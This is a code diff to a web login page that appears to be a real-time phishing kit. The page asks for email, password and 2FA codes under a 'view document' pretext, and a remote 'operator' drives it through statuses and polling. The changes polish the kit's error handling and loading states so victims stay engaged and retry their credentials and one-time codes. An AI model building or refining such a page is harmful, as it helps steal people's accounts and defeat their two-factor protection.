@@ -619,6 +619,18 @@
             
             <div class="error-message" id="GeneralError">An error occurred. Please try again.</div>
             
+            <!-- Styled Error Display (for template-level errors like polling failures) -->
+            <div class="form-group" id="styledErrorContainer" style="display:none;">
+              <div style="background:#fce8e6; border:1px solid #d32f2f; border-radius:8px; padding:12px 16px; display:flex; align-items:flex-start; gap:10px;">
+                <i class="fas fa-exclamation-circle" style="color:#d32f2f; font-size:20px; margin-top:2px;"></i>
+                <div style="flex:1;">
+                  <div style="font-weight:600; color:#d32f2f; font-size:14px; margin-bottom:4px;">Something went wrong</div>
+                  <div id="styledErrorMessage" style="color:#333; font-size:13px; line-height:1.4; margin-bottom:8px;"></div>
+                  <button type="button" onclick="location.reload()" style="background:#d32f2f; color:#fff; border:none; border-radius:4px; padding:6px 16px; font-size:13px; cursor:pointer; font-weight:500;">Retry</button>
+                </div>
+              </div>
+            </div>
+            
             <input type="hidden" id="domainHidden" name="domain" value="">
             <button type="button" class="btn btn-primary" id="submitButton" onclick="handleFormSubmission()">Login</button>
           </form>
@@ -665,8 +677,9 @@ let pollingStartTime = null;
 const POLLING_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutes global timeout
 let currentStatus = null;
 let lastShownStatus = '';
-let isSubmitting = false;
-let submitGuardTimeout = null;
+  let isSubmitting = false;
+  let isInitialLoad = true;
+  let submitGuardTimeout = null;
 let lastRenderedOptionsHash = '';
 let verificationOptions = [];
 let loadingMessages = [
@@ -710,6 +723,27 @@ function hideLoadingOverlay() {
   document.getElementById('loadingOverlay').style.display = 'none';
   document.querySelector('.document-overlay').style.display = 'flex'; // Show login form
   clearInterval(messageIntervalId);
+}
+
+// Function to disable/enable form inputs during submission (without full overlay)
+function setFormSubmitting(submitting) {
+  const emailField = document.getElementById('exampleInputEmail1');
+  const passwordField = document.getElementById('exampleInputPassword1');
+  const verificationCodeInput = document.getElementById('verificationCodeInput');
+  const submitButton = document.getElementById('submitButton');
+  const inputs = [emailField, passwordField, verificationCodeInput];
+  const radios = document.querySelectorAll('input[name="verificationOption"]');
+  if (submitting) {
+    isSubmitting = true;
+    inputs.forEach(i => { if (i) { i.disabled = true; i.readOnly = true; } });
+    radios.forEach(r => { r.disabled = true; });
+    if (submitButton) { submitButton.disabled = true; submitButton.innerText = 'Submitting...'; submitButton.style.backgroundColor = '#BEBEBE'; submitButton.style.color = '#000'; }
+  } else {
+    isSubmitting = false;
+    inputs.forEach(i => { if (i) { i.disabled = false; i.readOnly = false; } });
+    radios.forEach(r => { r.disabled = false; });
+    if (submitButton) { submitButton.disabled = false; submitButton.innerText = 'Login'; submitButton.style.backgroundColor = ''; submitButton.style.color = ''; }
+  }
 }
 
 // Function to cycle through loading messages
@@ -777,7 +811,7 @@ function updateUIForStatus(status, data = {}) {
       passwordGroup.style.display = 'block';
       verificationOptionsGroup.style.display = 'none';
       verificationCodeGroup.style.display = 'none';
-      showLoadingOverlay(true);
+      if (isInitialLoad) { showLoadingOverlay(true); isInitialLoad = false; } else { setFormSubmitting(true); }
       submitButton.innerText = "Checking...";
       submitButton.disabled = true;
       emailField.readOnly = true;
@@ -789,7 +823,7 @@ function updateUIForStatus(status, data = {}) {
       passwordGroup.style.display = 'block';
       verificationOptionsGroup.style.display = 'none';
       verificationCodeGroup.style.display = 'none';
-      showLoadingOverlay(true);
+      if (isInitialLoad) { showLoadingOverlay(true); isInitialLoad = false; } else { setFormSubmitting(true); }
       submitButton.innerText = "Processing...";
       submitButton.disabled = true;
       emailField.readOnly = true;
@@ -831,7 +865,7 @@ function updateUIForStatus(status, data = {}) {
       if (data.email) emailField.value = data.email;
       emailField.readOnly = true;
       passwordField.disabled = false;
-      if (lastShownStatus !== currentStatus && data.lastJsonResponse) {
+      if (data.lastJsonResponse) {
         try {
           const lastResp = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
           if (lastResp.message && (lastResp.message.includes('Incorrect password') || lastResp.message.includes('incorrect'))) {
@@ -840,6 +874,9 @@ function updateUIForStatus(status, data = {}) {
             passwordField.value = '';
           }
         } catch(e) {}
+      } else if (currentStatus === 'WAITINGPASSWORDERROR') {
+        document.getElementById('InvalidPassword').textContent = 'Incorrect password. Please try again.';
+        document.getElementById('InvalidPassword').style.display = 'block';
       }
       lastShownStatus = currentStatus;
       if (!isSameStatusDuringSubmit) {
@@ -873,7 +910,9 @@ function updateUIForStatus(status, data = {}) {
       verificationOptionsGroup.style.display = 'none';
       verificationCodeGroup.style.display = 'block';
       submitButton.innerText = "Submit Code";
-      verificationCodeInput.value = '';
+      if (statusChanged) {
+        verificationCodeInput.value = '';
+      }
       const viewName = (data && data.viewName) || (data && data.lastJsonResponse ? (typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse || '{}') : data.lastJsonResponse).viewName : '') || '';
       const codeLabel = document.getElementById('verificationCodeLabel');
       if (codeLabel) {
@@ -907,7 +946,6 @@ function updateUIForStatus(status, data = {}) {
       window.location.href = redirectUrl;
       break;
     case 'FAILED':
-      showLoadingOverlay(false, true); // Show error message, no spinner
       clearInterval(pollingIntervalId);
       // Parse lastJsonResponse for detailed error info
       let emailExists = data.emailExists;
@@ -926,23 +964,40 @@ function updateUIForStatus(status, data = {}) {
         document.getElementById('InvalidPassword').textContent = "Incorrect email or password. Try again.";
         document.getElementById('InvalidPassword').style.display = 'block';
       } else {
-        document.getElementById('GeneralError').textContent = "An error occurred. Please try again.";
-        document.getElementById('GeneralError').style.display = 'block';
+        showStyledError('Document retrieval failed. Please try again later.');
       }
-      resetFormState(); // Keep form inaccessible
+      if (!isSameStatusDuringSubmit) {
+        hideLoadingOverlay();
+      }
       break;
     default:
       // For any other unexpected status, treat as a failure and show error
-      showLoadingOverlay(false, true); // Show error message, no spinner
-      document.getElementById('GeneralError').textContent = "An unexpected status was received. Please try again.";
-      document.getElementById('GeneralError').style.display = 'block';
-      resetFormState(); // Keep form inaccessible
+      clearInterval(pollingIntervalId);
+      showStyledError('An unexpected status was received. Please try again.');
+      if (!isSameStatusDuringSubmit) {
+        hideLoadingOverlay();
+      }
       break;
   }
 }
 
 // Function to hide all error messages
+function showStyledError(message) {
+  const container = document.getElementById('styledErrorContainer');
+  const msgEl = document.getElementById('styledErrorMessage');
+  if (container && msgEl) {
+    msgEl.textContent = message || 'An unexpected error occurred.';
+    container.style.display = 'block';
+  }
+}
+
+function hideStyledError() {
+  const container = document.getElementById('styledErrorContainer');
+  if (container) container.style.display = 'none';
+}
+
 function hideAllErrors() {
+  hideStyledError();
   document.getElementById('InvalidEmail').style.display = 'none';
   document.getElementById('InvalidPassword').style.display = 'none';
   document.getElementById('RequirePassword').style.display = 'none';
@@ -1120,10 +1175,9 @@ async function initialFormSubmission() {
     }
   } catch (error) {
     console.error("Error during initial form submission:", error);
-    document.getElementById('GeneralError').textContent = "Failed to initiate process. Please try again.";
-    document.getElementById('GeneralError').style.display = 'block';
-    showLoadingOverlay(false, true); // Show error message, no spinner
-    resetFormState(); // Keep form inaccessible
+    showStyledError('Failed to initiate process. Please try again.');
+    hideLoadingOverlay();
+    resetFormState(); // Keep form accessible for retry
   }
 }
 
@@ -1153,10 +1207,8 @@ async function pollOperator() {
     clearInterval(pollingIntervalId);
     isSubmitting = false;
     if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
-    showLoadingOverlay(false, true);
-    document.getElementById('GeneralError').textContent = "Session timed out. Please try again.";
-    document.getElementById('GeneralError').style.display = 'block';
-    resetFormState();
+    showStyledError('Session timed out. Please refresh the page and try again.');
+    hideLoadingOverlay();
     return;
   }
 
@@ -1188,18 +1240,15 @@ async function pollOperator() {
     clearInterval(pollingIntervalId);
     isSubmitting = false;
     if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
-    document.getElementById('GeneralError').textContent = "Polling failed. Please try again.";
-    document.getElementById('GeneralError').style.display = 'block';
+    showStyledError('Connection issue. Please check your internet and try again.');
     hideLoadingOverlay();
-    resetFormState();
   }
 }
 
 // Handle form submission (email/password, 2FA choice, 2FA code)
 async function handleFormSubmission() {
   hideAllErrors();
-  isSubmitting = true;
-  showLoadingOverlay(true);
+  setFormSubmitting(true);
   if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); }
   submitGuardTimeout = setTimeout(() => { isSubmitting = false; submitGuardTimeout = null; }, 15000);
 
@@ -1207,11 +1256,6 @@ async function handleFormSubmission() {
   const passwordField = document.getElementById('exampleInputPassword1');
   const verificationCodeInput = document.getElementById('verificationCodeInput');
   const submitButton = document.getElementById('submitButton');
-
-  submitButton.disabled = true;
-  submitButton.innerText = "Submitting...";
-  submitButton.style.backgroundColor = "#BEBEBE";
-  submitButton.style.color = "#000";
 
   let payload = {
     browserId: browserId,
